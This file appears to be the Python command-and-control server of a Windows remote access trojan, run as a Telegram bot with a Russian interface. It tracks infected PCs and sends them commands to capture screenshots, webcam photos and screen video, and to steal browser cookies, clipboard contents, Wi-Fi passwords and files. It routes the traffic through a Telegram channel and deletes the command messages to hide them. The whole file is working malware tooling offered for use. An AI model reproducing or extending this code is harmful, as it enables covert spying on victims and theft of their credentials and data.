import asyncio
import os
import base64
import sqlite3
import time
import json
import re
from datetime import datetime
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, BufferedInputFile
from aiogram.exceptions import TelegramBadRequest
from dotenv import load_dotenv

load_dotenv()
TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = 5153650495
CHANNEL_USERNAME = "hurghgruuruhgrughuhgur47846776v7"

bot = Bot(token=TOKEN)
dp = Dispatcher()

# Хранилища
screenshot_buffers = {}
file_buffers = {}

# --- БАЗА ДАННЫХ ---
DB_PATH = os.path.join(os.path.dirname(__file__), "devices.db")

def init_db():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS devices (
            device_id TEXT PRIMARY KEY,
            name TEXT,
            last_seen INTEGER,
            is_notified INTEGER DEFAULT 0,
            ip_address TEXT,
            os_info TEXT,
            first_seen INTEGER
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS command_history (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT,
            command TEXT,
            executed_at INTEGER,
            status TEXT DEFAULT 'pending'
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS files (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT,
            filename TEXT,
            content BLOB,
            uploaded_at INTEGER
        )
    """)
    conn.commit()
    conn.close()

def update_device_in_db(device_id, name, is_notified=None, ip_address=None, os_info=None):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    current_time = int(time.time())
    
    cursor.execute("SELECT is_notified, first_seen FROM devices WHERE device_id = ?", (device_id,))
    row = cursor.fetchone()
    
    if row is None:
        notif = is_notified if is_notified is not None else 0
        cursor.execute("""INSERT INTO devices 
                         (device_id, name, last_seen, is_notified, ip_address, os_info, first_seen) 
                         VALUES (?, ?, ?, ?, ?, ?, ?)""",
                       (device_id, name, current_time, notif, ip_address, os_info, current_time))
    else:
        first_seen = row[1] if row[1] else current_time
        if is_notified is not None:
            cursor.execute("""UPDATE devices 
                            SET name = ?, last_seen = ?, is_notified = ?, ip_address = ?, os_info = ?, first_seen = ? 
                            WHERE device_id = ?""",
                           (name, current_time, is_notified, ip_address, os_info, first_seen, device_id))
        else:
            cursor.execute("""UPDATE devices 
                            SET name = ?, last_seen = ?, ip_address = ?, os_info = ? 
                            WHERE device_id = ?""",
                           (name, current_time, ip_address, os_info, device_id))
        
    conn.commit()
    conn.close()

def get_all_devices():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("SELECT device_id, name, last_seen, ip_address, os_info, first_seen FROM devices")
    rows = cursor.fetchall()
    conn.close()
    return rows

def get_device(device_id):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("SELECT name, last_seen, is_notified, ip_address, os_info, first_seen FROM devices WHERE device_id = ?", (device_id,))
    row = cursor.fetchone()
    conn.close()
    return row

def delete_device(device_id):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("DELETE FROM devices WHERE device_id = ?", (device_id,))
    conn.commit()
    conn.close()

def log_command(device_id, command):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("INSERT INTO command_history (device_id, command, executed_at) VALUES (?, ?, ?)",
                   (device_id, command, int(time.time())))
    conn.commit()
    conn.close()

def save_file_to_db(device_id, filename, content):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("INSERT INTO files (device_id, filename, content, uploaded_at) VALUES (?, ?, ?, ?)",
                   (device_id, filename, content, int(time.time())))
    conn.commit()
    conn.close()

# --- ИНТЕРФЕЙС ---
def get_main_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📋 Список устройств", callback_data="back_to_list")],
        [InlineKeyboardButton(text="📊 Статистика системы", callback_data="global_stats")],
        [InlineKeyboardButton(text="🗑 Очистить оффлайн", callback_data="clean_offline")],
        [InlineKeyboardButton(text="📤 Массовая команда", callback_data="mass_command")]
    ])

def get_device_menu(device_id: str, device_name: str = "ПК"):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📊 Инфо и Мониторинг", callback_data=f"cat_mon_{device_id}")],
        [InlineKeyboardButton(text="⚙️ Системные действия", callback_data=f"cat_sys_{device_id}")],
        [InlineKeyboardButton(text="🌐 Открытие ресурсов", callback_data=f"cat_web_{device_id}")],
        [InlineKeyboardButton(text="🛠 Утилиты и Приложения", callback_data=f"cat_util_{device_id}")],
        [InlineKeyboardButton(text="🔍 Дополнительно", callback_data=f"cat_extra_{device_id}")],
        [InlineKeyboardButton(text="📁 Файловый менеджер", callback_data=f"cat_files_{device_id}")],
        [InlineKeyboardButton(text="🕵️ Сбор данных", callback_data=f"cat_data_{device_id}")],
        [InlineKeyboardButton(text="⬅️ В главное меню", callback_data="go_to_main_start")]
    ])

def get_monitoring_menu(device_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📸 Скриншот", callback_data=f"cmd_screen_{device_id}")],
        [InlineKeyboardButton(text="📷 Фото с веб-камеры", callback_data=f"cmd_webcam_{device_id}")],
        [InlineKeyboardButton(text="📋 Процессы", callback_data=f"cmd_tasklist_{device_id}")],
        [InlineKeyboardButton(text="🪟 Активные окна", callback_data=f"cmd_windows_{device_id}")],
        [InlineKeyboardButton(text="📱 Открытые программы", callback_data=f"cmd_apps_{device_id}")],
        [InlineKeyboardButton(text="📋 Буфер обмена", callback_data=f"cmd_clipboard_{device_id}")],
        [InlineKeyboardButton(text="🎥 Видео с экрана (5с)", callback_data=f"cmd_video_{device_id}")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data=f"manage_{device_id}")]
    ])

def get_system_menu(device_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔒 Блок экрана", callback_data=f"cmd_lock_{device_id}"),
         InlineKeyboardButton(text="🌙 Сон", callback_data=f"cmd_sleep_{device_id}")],
        [InlineKeyboardButton(text="🔄 Перезагрузка", callback_data=f"cmd_reboot_{device_id}"),
         InlineKeyboardButton(text="🛑 Выключение", callback_data=f"cmd_shutdown_{device_id}")],
        [InlineKeyboardButton(text="🔊 Звук макс.", callback_data=f"cmd_volmax_{device_id}"),
         InlineKeyboardButton(text="🔇 Mute", callback_data=f"cmd_mute_{device_id}")],
        [InlineKeyboardButton(text="💡 Яркость 50%", callback_data=f"cmd_brightness50_{device_id}"),
         InlineKeyboardButton(text="💡 Яркость 100%", callback_data=f"cmd_brightness100_{device_id}")],
        [InlineKeyboardButton(text="🔄 Сброс Explorer", callback_data=f"cmd_restart_explorer_{device_id}")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data=f"manage_{device_id}")]
    ])

def get_web_menu(device_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🌐 YouTube", callback_data=f"cmd_yt_{device_id}"),
         InlineKeyboardButton(text="🔍 Google", callback_data=f"cmd_google_{device_id}")],
        [InlineKeyboardButton(text="🗺 Карты", callback_data=f"cmd_maps_{device_id}"),
         InlineKeyboardButton(text="📺 Twitch", callback_data=f"cmd_twitch_{device_id}")],
        [InlineKeyboardButton(text="💬 Сообщение", callback_data=f"cmd_msg_{device_id}")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data=f"manage_{device_id}")]
    ])

def get_util_menu(device_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🧮 Калькулятор", callback_data=f"cmd_calc_{device_id}"),
         InlineKeyboardButton(text="📝 Блокнот", callback_data=f"cmd_notepad_{device_id}")],
        [InlineKeyboardButton(text="🎨 Paint", callback_data=f"cmd_paint_{device_id}"),
         InlineKeyboardButton(text="⏳ Скринывер", callback_data=f"cmd_scr_{device_id}")],
        [InlineKeyboardButton(text="📷 Камера", callback_data=f"cmd_camera_{device_id}")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data=f"manage_{device_id}")]
    ])

def get_extra_menu(device_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💻 Системная инфо", callback_data=f"cmd_sysinfo_{device_id}")],
        [InlineKeyboardButton(text="🌐 Сетевая инфо", callback_data=f"cmd_netinfo_{device_id}")],
        [InlineKeyboardButton(text="🔋 Батарея", callback_data=f"cmd_battery_{device_id}")],
        [InlineKeyboardButton(text="🔄 Точка восстановления", callback_data=f"cmd_restore_{device_id}")],
        [InlineKeyboardButton(text="🔓 Разблокировать приложения", callback_data=f"cmd_unblock_{device_id}")],
        [InlineKeyboardButton(text="📋 Журнал команд", callback_data=f"cmd_history_{device_id}")],
        [InlineKeyboardButton(text="📊 Инфо о дисках", callback_data=f"cmd_disks_{device_id}")],
        [InlineKeyboardButton(text="🌐 Сетевые адаптеры", callback_data=f"cmd_adapters_{device_id}")],
        [InlineKeyboardButton(text="⚙️ Переменные окружения", callback_data=f"cmd_env_{device_id}")],
        [InlineKeyboardButton(text="🖥 Разрешение экрана", callback_data=f"cmd_resolution_{device_id}")],
        [InlineKeyboardButton(text="🔌 Открытые порты", callback_data=f"cmd_ports_{device_id}")],
        [InlineKeyboardButton(text="🗑 Удалить устройство", callback_data=f"delete_{device_id}")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data=f"manage_{device_id}")]
    ])

def get_files_menu(device_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📂 Список файлов на ПК", callback_data=f"cmd_files_{device_id}")],
        [InlineKeyboardButton(text="📤 Загрузить файл на ПК", callback_data=f"cmd_upload_file_{device_id}")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data=f"manage_{device_id}")]
    ])

def get_data_menu(device_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🍪 Куки всех браузеров", callback_data=f"cmd_cookies_{device_id}")],
        [InlineKeyboardButton(text="📶 Wi-Fi пароли", callback_data=f"cmd_wifi_{device_id}")],
        [InlineKeyboardButton(text="📦 Установленное ПО", callback_data=f"cmd_software_{device_id}")],
        [InlineKeyboardButton(text="🚀 Автозагрузка", callback_data=f"cmd_startup_{device_id}")],
        [InlineKeyboardButton(text="⚙️ Системные службы", callback_data=f"cmd_services_{device_id}")],
        [InlineKeyboardButton(text="📋 Системные события", callback_data=f"cmd_events_{device_id}")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data=f"manage_{device_id}")]
    ])

# --- ОБРАБОТЧИКИ ---

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        await message.answer("⛔ Доступ запрещен")
        return
    await message.answer("🤖 **Панель управления Windows v4.0**\n\n"
                        "Все данные сохраняются в БД.\n"
                        "Выберите действие:", 
                        parse_mode="Markdown",
                        reply_markup=get_main_menu())

@dp.callback_query(F.data == "go_to_main_start")
async def go_to_main_start(callback: types.CallbackQuery):
    try:
        await callback.message.edit_text("🤖 **Главное меню**", 
                                        parse_mode="Markdown", 
                                        reply_markup=get_main_menu())
    except:
        await callback.message.edit_caption(caption="🤖 **Главное меню**",
                                           parse_mode="Markdown",
                                           reply_markup=get_main_menu())

@dp.callback_query(F.data == "back_to_list")
async def show_devices_callback(callback: types.CallbackQuery):
    devices = get_all_devices()
    if not devices:
        await callback.message.edit_text("❌ Список устройств пуст.", reply_markup=get_main_menu())
        return
    
    keyboard = []
    current_time = int(time.time())
    
    name_count = {}
    for dev_id, name, last_seen, ip, os_info, first_seen in devices:
        name_count[name] = name_count.get(name, 0) + 1
    
    for dev_id, name, last_seen, ip, os_info, first_seen in devices:
        status_emoji = "🟢" if current_time - last_seen < 180 else "🔴"
        status_text = "Онлайн" if current_time - last_seen < 180 else "Оффлайн"
        
        if name_count[name] > 1:
            display_name = f"{name} ({dev_id[:8]})"
        else:
            display_name = name
        
        btn_text = f"{status_emoji} {display_name} ({status_text})"
        keyboard.append([InlineKeyboardButton(text=btn_text, callback_data=f"manage_{dev_id}")])
    
    keyboard.append([InlineKeyboardButton(text="⬅️ Назад", callback_data="go_to_main_start")])
    
    await callback.message.edit_text("🎛 **Список устройств из Базы Данных:**", 
                                   parse_mode="Markdown", 
                                   reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard))

@dp.callback_query(F.data == "clean_offline")
async def clean_offline(callback: types.CallbackQuery):
    devices = get_all_devices()
    current_time = int(time.time())
    deleted = 0
    
    for dev_id, name, last_seen, ip, os_info, first_seen in devices:
        if current_time - last_seen > 86400:
            delete_device(dev_id)
            deleted += 1
    
    await callback.answer(f"🗑 Удалено {deleted} оффлайн устройств")
    await show_devices_callback(callback)

@dp.callback_query(F.data == "global_stats")
async def global_stats(callback: types.CallbackQuery):
    devices = get_all_devices()
    total = len(devices)
    online = 0
    current_time = int(time.time())
    
    os_stats = {}
    for dev_id, name, last_seen, ip, os_info, first_seen in devices:
        if current_time - last_seen < 180:
            online += 1
        if os_info:
            os_key = os_info.split()[0] if os_info else "Unknown"
            os_stats[os_key] = os_stats.get(os_key, 0) + 1
    
    text = f"📊 **Глобальная статистика:**\n"
    text += f"• Всего устройств: {total}\n"
    text += f"• Онлайн: {online}\n"
    text += f"• Оффлайн: {total - online}\n"
    text += f"• Активность: {int(online/total*100) if total > 0 else 0}%\n\n"
    text += "**ОС на устройствах:**\n"
    for os_name, count in os_stats.items():
        text += f"• {os_name}: {count}\n"
    
    await callback.message.edit_text(text, parse_mode="Markdown", reply_markup=get_main_menu())

@dp.callback_query(F.data == "mass_command")
async def mass_command_menu(callback: types.CallbackQuery):
    devices = get_all_devices()
    if not devices:
        await callback.answer("❌ Нет устройств")
        return
    
    keyboard = []
    for dev_id, name, last_seen, ip, os_info, first_seen in devices:
        keyboard.append([InlineKeyboardButton(text=f"✅ {name}", callback_data=f"mass_sel_{dev_id}")])
    
    keyboard.append([InlineKeyboardButton(text="📤 Отправить всем", callback_data="mass_send_all")])
    keyboard.append([InlineKeyboardButton(text="⬅️ Назад", callback_data="go_to_main_start")])
    
    await callback.message.edit_text("📤 **Выберите устройства для массовой команды:**", 
                                   parse_mode="Markdown",
                                   reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard))

@dp.callback_query(F.data.startswith("manage_"))
async def manage_device(callback: types.CallbackQuery):
    device_id = callback.data.split("_")[1]
    device_info = get_device(device_id)
    if not device_info: 
        await callback.answer("❌ Устройство удалено или не найдено.")
        return
    
    current_time = int(time.time())
    name, last_seen, is_notified, ip, os_info, first_seen = device_info
    status_str = "🟢 Онлайн" if current_time - last_seen < 180 else "🔴 Оффлайн"
    
    uptime = "Неизвестно"
    if first_seen:
        days = (current_time - first_seen) // 86400
        uptime = f"{days} дн." if days > 0 else "Сегодня"
    
    text = f"💻 **Управление ПК:**\n"
    text += f"• Имя: `{name}`\n"
    text += f"• ID: `{device_id}`\n"
    text += f"• Статус: {status_str}\n"
    text += f"• IP: `{ip or 'Неизвестно'}`\n"
    text += f"• ОС: `{os_info or 'Неизвестно'}`\n"
    text += f"• В системе: {uptime}"
    
    markup = get_device_menu(device_id, name)
    
    try:
        await callback.message.edit_text(text=text, parse_mode="Markdown", reply_markup=markup)
    except:
        await callback.message.edit_caption(caption=text, parse_mode="Markdown", reply_markup=markup)

@dp.callback_query(F.data.startswith("delete_"))
async def delete_device_callback(callback: types.CallbackQuery):
    device_id = callback.data.split("_")[1]
    device_info = get_device(device_id)
    if device_info:
        delete_device(device_id)
        await callback.answer(f"✅ Устройство {device_info[0]} удалено")
    else:
        await callback.answer("❌ Устройство не найдено")
    
    await show_devices_callback(callback)

@dp.callback_query(F.data.startswith("cat_"))
async def handle_categories(callback: types.CallbackQuery):
    data = callback.data.split("_")
    if len(data) < 3:
        return
    
    cat, dev_id = data[1], data[2]
    text = ""
    markup = None
    
    if cat == "mon":
        text = "📊 **Мониторинг**\nВыберите действие:"
        markup = get_monitoring_menu(dev_id)
    elif cat == "sys":
        text = "⚙️ **Системные действия**\nВыберите действие:"
        markup = get_system_menu(dev_id)
    elif cat == "web":
        text = "🌐 **Ресурсы**\nВыберите действие:"
        markup = get_web_menu(dev_id)
    elif cat == "util":
        text = "🛠 **Утилиты**\nВыберите действие:"
        markup = get_util_menu(dev_id)
    elif cat == "extra":
        text = "🔍 **Дополнительные функции**\nВыберите действие:"
        markup = get_extra_menu(dev_id)
    elif cat == "files":
        text = "📁 **Файловый менеджер**\nВыберите действие:"
        markup = get_files_menu(dev_id)
    elif cat == "data":
        text = "🕵️ **Сбор данных с ПК**\nВыберите что собрать:"
        markup = get_data_menu(dev_id)
    else:
        return

    try:
        await callback.message.edit_text(text=text, parse_mode="Markdown", reply_markup=markup)
    except:
        await callback.message.edit_caption(caption=text, parse_mode="Markdown", reply_markup=markup)

@dp.callback_query(F.data.startswith("cmd_"))
async def send_command(callback: types.CallbackQuery):
    parts = callback.data.split("_")
    if len(parts) < 3:
        await callback.answer("❌ Ошибка в команде")
        return
    
    cmd_type = parts[1]
    device_id = "_".join(parts[2:])
    
    cmd_map = {
        "screen": "screen",
        "webcam": "webcam",
        "tasklist": "tasklist",
        "windows": "windows",
        "apps": "apps",
        "clipboard": "clipboard",
        "video": "video",
        "lock": "lock",
        "sleep": "sleep",
        "reboot": "reboot",
        "shutdown": "shutdown",
        "volmax": "volmax",
        "mute": "mute",
        "unmute": "unmute",
        "brightness50": "brightness:50",
        "brightness100": "brightness:100",
        "restart_explorer": "restart_explorer",
        "yt": "yt",
        "google": "google",
        "maps": "maps",
        "twitch": "twitch",
        "msg": "msg",
        "calc": "calc",
        "notepad": "notepad",
        "paint": "paint",
        "scr": "scr",
        "camera": "camera",
        "sysinfo": "sysinfo",
        "netinfo": "netinfo",
        "battery": "battery",
        "restore": "restore",
        "unblock": "unblock",
        "history": "history",
        "disks": "disks",
        "adapters": "adapters",
        "env": "env",
        "resolution": "resolution",
        "ports": "ports",
        "cookies": "cookies",
        "wifi": "wifi",
        "software": "software",
        "startup": "startup",
        "services": "services",
        "events": "events",
        "files": "files",
        "list_files": "list_files",
        "upload_file": "upload_file",
    }
    
    full_cmd = cmd_map.get(cmd_type, cmd_type)
    
    try:
        await bot.send_message(chat_id=f"@{CHANNEL_USERNAME}", text=f"CMD:{device_id}:{full_cmd}")
        log_command(device_id, full_cmd)
        await callback.answer("✅ Команда отправлена!")
    except Exception as e:
        await callback.answer(f"❌ Ошибка отправки: {str(e)[:50]}")

# --- ПРИЕМ ДАННЫХ ИЗ КАНАЛА ---

@dp.channel_post(F.text)
async def handle_channel_messages(message: types.Message):
    text = message.text
    if not text:
        return
    
    # Удаляем команды из канала сразу после отправки
    if text.startswith("CMD:") or text.startswith("UPLOAD_FILE:") or text.startswith("WALLPAPER_SET:"):
        try:
            await message.delete()
        except:
            pass
        return
    
    # LOG_REPLY - обрабатываем текстовые ответы от клиента и отправляем админу
    if text.startswith("LOG_REPLY:"):
        try:
            text_data = text[10:]
            
            # Ищем устройство по имени
            device_id = None
            pc_name = None
            for dev_id, name, last_seen, ip, os_info, first_seen in get_all_devices():
                if name in text_data[:100]:
                    device_id = dev_id
                    pc_name = name
                    break
            
            markup = get_device_menu(device_id) if device_id else None
            
            # Отправляем админу в личный чат
            if len(text_data) > 4000:
                for i in range(0, len(text_data), 4000):
                    chunk = text_data[i:i+4000]
                    await bot.send_message(
                        chat_id=ADMIN_ID, 
                        text=chunk, 
                        parse_mode="Markdown", 
                        reply_markup=markup if i == 0 else None
                    )
            else:
                await bot.send_message(
                    chat_id=ADMIN_ID, 
                    text=text_data, 
                    parse_mode="Markdown", 
                    reply_markup=markup
                )
            
            await message.delete()
        except Exception as e:
            print(f"Error processing LOG_REPLY: {e}")
        return
    
    # PING
    if text.startswith("PING:"):
        try:
            parts = text.split(":", 3)
            if len(parts) >= 3:
                device_id = parts[1]
                pc_name = parts[2]
                ip_address = parts[3] if len(parts) > 3 else None
                
                dev = get_device(device_id)
                current_time = int(time.time())
                
                if not dev:
                    update_device_in_db(device_id, pc_name, is_notified=1, ip_address=ip_address)
                    await bot.send_message(
                        chat_id=ADMIN_ID,
                        text=f"🆕 **Зарегистрирован новый ПК:** `{pc_name}`\nID: `{device_id}`",
                        parse_mode="Markdown",
                        reply_markup=get_device_menu(device_id)
                    )
                else:
                    last_seen = dev[1]
                    is_notified = dev[2]
                    update_device_in_db(device_id, pc_name, ip_address=ip_address)
                    
                    if current_time - last_seen >= 300:
                        await bot.send_message(
                            chat_id=ADMIN_ID,
                            text=f"🟢 **ПК `{pc_name}` снова на связи!**",
                            parse_mode="Markdown",
                            reply_markup=get_device_menu(device_id)
                        )
                
                await message.delete()
        except Exception as e:
            print(f"Error processing PING: {e}")
        return
    
    # SCR_PART
    if text.startswith("SCR_PART:"):
        try:
            parts = text.split(":", 4)
            if len(parts) < 5:
                return
            _, device_id, part_num, total_parts, base64_chunk = parts
            part_num = int(part_num)
            total_parts = int(total_parts)
            
            if device_id not in screenshot_buffers:
                screenshot_buffers[device_id] = {}
                
            screenshot_buffers[device_id][part_num] = base64_chunk
            await message.delete()
            
            if len(screenshot_buffers[device_id]) == total_parts:
                device_info = get_device(device_id)
                pc_name = device_info[0] if device_info else "ПК"
                
                full_base64 = "".join([screenshot_buffers[device_id][i] for i in range(total_parts)])
                del screenshot_buffers[device_id]
                
                try:
                    image_bytes = base64.b64decode(full_base64)
                    await bot.send_photo(
                        chat_id=ADMIN_ID,
                        photo=BufferedInputFile(image_bytes, filename="screenshot.jpg"),
                        caption=f"📸 **Скриншот с ПК:** `{pc_name}`",
                        parse_mode="Markdown",
                        reply_markup=get_device_menu(device_id)
                    )
                except Exception as e:
                    await bot.send_message(
                        chat_id=ADMIN_ID,
                        text=f"❌ Ошибка обработки скриншота с {pc_name}: {str(e)[:100]}"
                    )
        except Exception as e:
            print(f"Error processing SCR_PART: {e}")
        return
    
    # VIDEO_PART
    if text.startswith("VIDEO_PART:"):
        try:
            parts = text.split(":", 4)
            if len(parts) < 5:
                return
            _, device_id, part_num, total_parts, base64_chunk = parts
            part_num = int(part_num)
            total_parts = int(total_parts)
            
            key = f"video_{device_id}"
            if key not in file_buffers:
                file_buffers[key] = {}
                
            file_buffers[key][part_num] = base64_chunk
            await message.delete()
            
            if len(file_buffers[key]) == total_parts:
                device_info = get_device(device_id)
                pc_name = device_info[0] if device_info else "ПК"
                
                full_base64 = "".join([file_buffers[key][i] for i in range(total_parts)])
                del file_buffers[key]
                
                try:
                    file_bytes = base64.b64decode(full_base64)
                    await bot.send_video(
                        chat_id=ADMIN_ID,
                        video=BufferedInputFile(file_bytes, filename="screen_record.mp4"),
                        caption=f"🎥 **Видео с экрана ПК:** `{pc_name}`",
                        parse_mode="Markdown",
                        reply_markup=get_device_menu(device_id)
                    )
                except Exception as e:
                    await bot.send_message(
                        chat_id=ADMIN_ID,
                        text=f"❌ Ошибка обработки видео с {pc_name}: {str(e)[:100]}"
                    )
        except Exception as e:
            print(f"Error processing VIDEO_PART: {e}")
        return
    
    # FILE_PART
    if text.startswith("FILE_PART:"):
        try:
            parts = text.split(":", 5)
            if len(parts) < 6:
                return
            _, device_id, filename, part_num, total_parts, base64_chunk = parts
            part_num = int(part_num)
            total_parts = int(total_parts)
            
            key = f"file_{device_id}_{filename}"
            if key not in file_buffers:
                file_buffers[key] = {}
                
            file_buffers[key][part_num] = base64_chunk
            await message.delete()
            
            if len(file_buffers[key]) == total_parts:
                device_info = get_device(device_id)
                pc_name = device_info[0] if device_info else "ПК"
                
                full_base64 = "".join([file_buffers[key][i] for i in range(total_parts)])
                del file_buffers[key]
                
                try:
                    file_bytes = base64.b64decode(full_base64)
                    save_file_to_db(device_id, filename, file_bytes)
                    
                    await bot.send_message(
                        chat_id=ADMIN_ID,
                        text=f"📁 **Получен файл с ПК:** `{pc_name}`\n"
                             f"📄 Имя: `{filename}`\n"
                             f"📦 Размер: {len(file_bytes) // 1024} KB",
                        parse_mode="Markdown",
                        reply_markup=get_device_menu(device_id)
                    )
                except Exception as e:
                    await bot.send_message(
                        chat_id=ADMIN_ID,
                        text=f"❌ Ошибка обработки файла с {pc_name}: {str(e)[:100]}"
                    )
        except Exception as e:
            print(f"Error processing FILE_PART: {e}")
        return
    
    # WALLPAPER_SET
    if text.startswith("WALLPAPER_SET:"):
        try:
            parts = text.split(":", 1)
            if len(parts) < 2:
                return
            base64_img = parts[1]
            img_bytes = base64.b64decode(base64_img)
            
            await bot.send_photo(
                chat_id=ADMIN_ID,
                photo=BufferedInputFile(img_bytes, filename="wallpaper.jpg"),
                caption="🖼 **Обои успешно установлены на ПК!**",
                parse_mode="Markdown"
            )
            await message.delete()
        except Exception as e:
            print(f"Error processing WALLPAPER_SET: {e}")
        return

# --- ОБРАБОТКА ФАЙЛОВ ---

@dp.message(F.photo)
async def handle_photo(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    
    if message.caption and "wallpaper" in message.caption.lower():
        try:
            device_id_match = re.search(r'id[:\s]+([a-zA-Z0-9_-]+)', message.caption)
            if not device_id_match:
                await message.reply("❌ Укажите ID устройства в подписи: `wallpaper id:DEVICE_ID`")
                return
            
            device_id = device_id_match.group(1)
            photo = message.photo[-1]
            file = await bot.get_file(photo.file_id)
            file_data = await bot.download_file(file.file_path)
            
            img_base64 = base64.b64encode(file_data.getvalue()).decode('utf-8')
            
            await bot.send_message(
                chat_id=f"@{CHANNEL_USERNAME}",
                text=f"WALLPAPER_SET:{img_base64}"
            )
            await message.reply(f"🖼 Изображение отправлено для установки обоев на устройство `{device_id}`")
        except Exception as e:
            await message.reply(f"❌ Ошибка: {str(e)}")
        return
    
    await message.reply("📸 Фото получено. Используйте подпись `wallpaper id:DEVICE_ID` для установки обоев.")

@dp.message(F.document)
async def handle_document(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    
    if message.caption and "upload" in message.caption.lower():
        try:
            device_id_match = re.search(r'id[:\s]+([a-zA-Z0-9_-]+)', message.caption)
            if not device_id_match:
                await message.reply("❌ Укажите ID устройства в подписи: `upload id:DEVICE_ID`")
                return
            
            device_id = device_id_match.group(1)
            file = message.document
            file_data = await bot.download_file(file.file_path)
            
            file_base64 = base64.b64encode(file_data.getvalue()).decode('utf-8')
            
            await bot.send_message(
                chat_id=f"@{CHANNEL_USERNAME}",
                text=f"UPLOAD_FILE:{device_id}:{file.file_name}:{file_base64}"
            )
            await message.reply(f"📤 Файл `{file.file_name}` отправлен на устройство `{device_id}`")
        except Exception as e:
            await message.reply(f"❌ Ошибка: {str(e)}")
        return

# --- ЗАПУСК ---

async def main():
    init_db()
    print("[СЕРВЕР] База данных подключена. Ожидание сигналов...")
    print(f"[СЕРВЕР] Бот запущен, ID админа: {ADMIN_ID}")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
